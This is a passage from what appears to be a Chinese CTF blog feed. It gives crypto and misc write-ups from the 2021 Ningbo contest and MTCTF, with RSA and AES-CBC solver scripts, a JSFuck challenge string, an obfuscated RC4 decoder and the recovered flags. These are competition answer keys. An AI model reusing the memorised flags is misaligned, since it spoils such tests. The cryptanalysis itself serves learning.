n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>出来是<br><img alt="20210522 又是被组员嘲讽的一天-a21cb98f.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-a21cb98f.png" width="" height="" ><br>显然第二个才是我们需要的m，两个相减可以得到e</p>
<p>其次，出题人用一个加密函数加密了p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br></pre></td></tr></table></figure>

<p>提取一下，已知</p>
<p>$e\times S\equiv 1\ (mod\ (p+1)*(q+1))$<br>$not_p\equiv S\ (mod\ (p+1))$</p>
<p>这里主要是引入一条显而易见的形式</p>
<p>若$n\ mod\ (p*q)=1$，则，<br>$$<br>n\ mod\ q=1，n\ mod\ p=1<br>$$<br>这个结论的证明很简单，如果说n是p和q的乘积多1的话，那么，显然n也是p的倍数多1，q也同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line">m_e = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340930</span></span><br><span class="line">m = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line"><span class="comment"># e = m_e - m</span></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">not_p = m</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*not_p-<span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> isPrime((e*not_p-<span class="number">1</span>) // i - <span class="number">1</span>):</span><br><span class="line">        p = (e*not_p-<span class="number">1</span>) // i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_enc)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1) ^ bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个题目有两个值得我注意的，一是之一直都不知道AES这么爆破，但是现在知道怎么用脚本了，多亏了组员给我压力，但是原理后面还是要好好研究；二是找到一个全新的加密形式，利用键盘把选择被包围起来的字母，这个下面再说</p>
<p>首先找了下脚本，可以跑出iv和key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iv = long_to_bytes(iv)</span><br></pre></td></tr></table></figure>

<p>然后这里我们可以算出一部分的masg1，接着</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(m) ^ bytes_to_long(iv)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\r\x11\x18\x0b\x08L\x08\x0b\r\x0c\x14\n!\x00\x16\x13u&#123;qszeftwdr-thui&#x27;</span><br></pre></td></tr></table></figure>

<p>一看刚好是16位，结合前面的12个a还有’Neep’，整好32位，masg1齐了，他们和密文是异或的关系，那么masg2还会远吗？答案是肯定的，远</p>
<p>个der</p>
<p>连起来是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span><br></pre></td></tr></table></figure>

<p>我交了，我错了</p>
<p>没道理啊，虽然确实没有什么含义</p>
<p>但是又是307，又是那个男人，在我迷茫的时候给我指点迷津</p>
<p>手打了一遍之后发现是一种新编码，在Crypto全是古典的宁波赛上也遇到过<br>在电脑键盘上被这些字母包围起来的是真正的明文</p>
<p>根据分隔符提示，flag里面包着的应该是下面这一串，可能会有几个字母对错，根据含义就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">are-you-kidding</span><br></pre></td></tr></table></figure>

<h3 id="中国古代加密"><a href="#中国古代加密" class="headerlink" title="中国古代加密"></a>中国古代加密</h3><img alt="20210522 又是被组员嘲讽的一天-d5aef625.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-d5aef625.png" width="" height="" >

<p>挺有意思的提道题，主要是运用到了反切注音</p>
<p>然后一些细节有点费解吧</p>
<p>然后出了三条hint，比赛结束了才有时间写wp，主要是说第一个红字处的对子是构成了flag的头尾，然后第二个红字处的一首诗歌要分成上下来看，还有就是排列组合，其他的感觉也没什么用</p>
<p>我就从做出来的角度返回去看吧，求解的过程中还是很曲折的</p>
<p>首先我们看头尾是花甲重逢+三七岁月和古稀双庆+一度春秋，这个对子的出处就是乾隆和纪晓岚为一为140岁老人对的，60 * 2 + 27和70 * 2 + 1都是等于141，所以收尾开头是141</p>
<p>其次两首诗分开，前两句是对应声母，找出密文对应的声母在头两句14个字中的位子，后两句是对应韵母，同样也是找对应的，并且这里不考虑声调，声调是另外编码的1~4，然后拼凑起来，注意这里是要凑的，因为存在重复的韵母和声母，而且也没有确切指明是哪一个</p>
<p>最后的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">141181832310414124141</span><br></pre></td></tr></table></figure>

<p>这么看比较简单，但是当时提示比较少，走了很多歪路，因为反切注音还有很多变式和不成文的规定</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="The-Puzzles-of-the-Fifteen-Tiles"><a href="#The-Puzzles-of-the-Fifteen-Tiles" class="headerlink" title="The Puzzles of the Fifteen Tiles"></a>The Puzzles of the Fifteen Tiles</h3><img alt="20210522 又是被组员嘲讽的一天-76ae8347.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-76ae8347.png" width="" height="" >

<p>看看这个男人的嘴脸</p>
<p>第一次玩的时候，前面三行都整好了，但是最后一行借助倒数第三行怎么也搞不好</p>
<p>然后去找了一些技巧，主要有两点，第一是要制造出这样的形状，就容易得多</p>
<img alt="20210522 又是被组员嘲讽的一天-ee4c638b.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-ee4c638b.png" width="" height="" >

<p>其次，最后两排应该这样排好这两排的第一列， 然后是第二列，依次下去</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210523 宁波市第四届网络安全大赛Crypto方向WP</title>
    <url>/posts/a428a61f/</url>
    <content><![CDATA[<p>emmmmm前三届是怎么办起来的</p>
<span id="more"></span>

<h1 id="2021宁波市第四届网络安全大赛"><a href="#2021宁波市第四届网络安全大赛" class="headerlink" title="2021宁波市第四届网络安全大赛"></a>2021宁波市第四届网络安全大赛</h1><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>开始还以为题目错了，出题人还是很严谨的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">黑板上写着一道题：</span><br><span class="line">p=6FBC2F9E39</span><br><span class="line">q=44CF33</span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">求d？</span><br><span class="line">答案就是flag</span><br></pre></td></tr></table></figure>

<p>其实这些都是16进制的，然后求出来的d也要转换成16进制的大写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = <span class="number">0x6FBC2F9E39</span></span><br><span class="line">q = <span class="number">0x44CF33</span></span><br><span class="line">e = <span class="number">0x17</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(hex(d).upper())</span></span><br><span class="line">m = hashlib.md5(<span class="built_in">hex</span>(d).upper()[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>出来是这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">479A4D532737AC1EC3640F85E375B659</span><br></pre></td></tr></table></figure>

<p>包上flag{}就好</p>
<h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure>

<p>jsFuck丢进浏览器console里输出一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">119178353342323</span><br></pre></td></tr></table></figure>

<p>直接转还错了，瞎猜样地转了下bytes，竟然没有乱码，绝逼是它了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">t = <span class="number">119178353342323</span></span><br><span class="line"><span class="comment"># t = long_to_bytes(t)</span></span><br><span class="line">m = hashlib.md5(<span class="string">&#x27;ld_jws&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>最终得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;1E8FB0BC2025429CC885D2F794A89EB8&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nike"><a href="#nike" class="headerlink" title="nike"></a>nike</h3><p>恶心，抄别人题目<a href="https://blog.csdn.net/qq_41252520/article/details/101227790">原题</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __operator, __<span class="built_in">print</span>, __g, __y: [(sys.setrecursionlimit(<span class="number">1000000</span>), [[[[[(decode(cipher), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;D6VNEIRAryZ8Opdbl3bOwqmBD+lmFXbcd/XfgHalqYBh1FDtbJo=&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;decode&#x27;</span>], decode.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> cipher: (<span class="keyword">lambda</span> __l: [(init(), [[[(<span class="keyword">lambda</span> __after: (__<span class="built_in">print</span>(<span class="string">&#x27;sorry,you dont have the auth&#x27;</span>), <span class="number">0</span>)[<span class="number">1</span>] <span class="keyword">if</span> (__l[<span class="string">&#x27;auth&#x27;</span>] == <span class="number">1</span>) <span class="keyword">else</span> __after())(<span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">&#x27;result&#x27;</span>], <span class="built_in">chr</span>((s[(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="number">256</span>)] ^ <span class="built_in">ord</span>(__l[<span class="string">&#x27;cipher&#x27;</span>][__l[<span class="string">&#x27;i&#x27;</span>]])))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(__l[<span class="string">&#x27;cipher&#x27;</span>]))), <span class="keyword">lambda</span>: (__<span class="built_in">print</span>(__l[<span class="string">&#x27;result&#x27;</span>].encode(<span class="string">&#x27;base64&#x27;</span>)), <span class="literal">None</span>)[<span class="number">1</span>], [])) <span class="keyword">for</span> __l[<span class="string">&#x27;auth&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(__l[<span class="string">&#x27;cipher&#x27;</span>].decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;&#x27;</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(cipher)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;decode&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;init&#x27;</span>], init.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [(s.append(__l[<span class="string">&#x27;i&#x27;</span>]), (k.append(<span class="built_in">ord</span>(__l[<span class="string">&#x27;key&#x27;</span>][(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="built_in">len</span>(__l[<span class="string">&#x27;key&#x27;</span>]))])), __this())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[[[[__this() <span class="keyword">for</span> s[__l[<span class="string">&#x27;j&#x27;</span>]] <span class="keyword">in</span> [(__l[<span class="string">&#x27;tmp&#x27;</span>])]][<span class="number">0</span>] <span class="keyword">for</span> s[__l[<span class="string">&#x27;i&#x27;</span>]] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;j&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;tmp&#x27;</span>] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;i&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [((((__l[<span class="string">&#x27;j&#x27;</span>] + s[__l[<span class="string">&#x27;i&#x27;</span>]]) + k[__l[<span class="string">&#x27;i&#x27;</span>]]) % <span class="number">256</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: <span class="literal">None</span>, []), []) <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;aV9hbV9ub3RfZmxhZw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;init&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;s&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;sys&#x27;</span>] <span class="keyword">in</span> [(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>, __g, __g))]][<span class="number">0</span>])(<span class="built_in">__import__</span>(<span class="string">&#x27;operator&#x27;</span>, level=<span class="number">0</span>), <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>, level=<span class="number">0</span>).__dict__[<span class="string">&#x27;print&#x27;</span>], <span class="built_in">globals</span>(), (<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))))</span><br></pre></td></tr></table></figure>

<p>写在一行了</p>
<p>按照原题的改就好，虽然不知道为什么有红线报错还是能运行</p>
<p>出来一个base64转一下，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46B387CB0278D&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个交不上，然后用python2运行他给我们的脚本，发现出来的base64有些许不同</p>
<p>好家伙，原来是魔改</p>
<p>最后得到的是，只有几位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46O1X7CB0278D&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>然后Crypto就没出题了，都古典，做了几个没啥兴致，也没啥思路了</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>有道宁波训练赛的题目，找到wp，感觉加密方式也挺新颖的，摘记下</p>
<h3 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h3><img alt="20210523 前方到站宁波站-09be9b5a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-09be9b5a.png" width="" height="" >

<p>完全没思路，看师傅的吧</p>
<img alt="20210523 前方到站宁波站-1c21d9b3.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-1c21d9b3.png" width="" height="" >

<p>挺经典的，但不知道这种加密叫什么，就是一般的二维表格吧也不是，有点像playfair，但又不完全像，希望知道的师傅带带我这只小菜鸡吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210527 MTCTF2021Crypto方向部分复现</title>
    <url>/posts/43deb916/</url>
    <content><![CDATA[<img alt="easy_RSA-37a4a203.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-37a4a203.png" width="" height="" >

<p>看了下日期，又不能快乐地刷题了</p>
<p>那天竟然被宁波的比赛耽误，SSGYZTL，错过了美团，赛后复现一下</p>
<span id="more"></span>

<h1 id="20210527-MTCTF2021Crypto方向部分复现"><a href="#20210527-MTCTF2021Crypto方向部分复现" class="headerlink" title="20210527 MTCTF2021Crypto方向部分复现"></a>20210527 MTCTF2021Crypto方向部分复现</h1><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>第一层套了一个padding，比较常规不再赘述</p>
<p>第二层是多次一加密（Many Time Pad），大致的加密思路就是每次都用相同的key去加密明文，注意一次一密（One Time Pad）的区别</p>
<h3 id="第二层的题目描述"><a href="#第二层的题目描述" class="headerlink" title="第二层的题目描述"></a>第二层的题目描述</h3><p>输入第一层的密码，压缩包文件里的内容是这样的，有十二个十六进制的数字</p>
<img alt="easy_RSA-a8cb1b59.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-a8cb1b59.png" width="" height="">

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>话不多说，直接去找脚本，大致的思路是按照这位师傅的博客<a href="https://www.ruanx.net/many-time-pad/">https://www.ruanx.net/many-time-pad/</a>来的，讲得太好了</p>
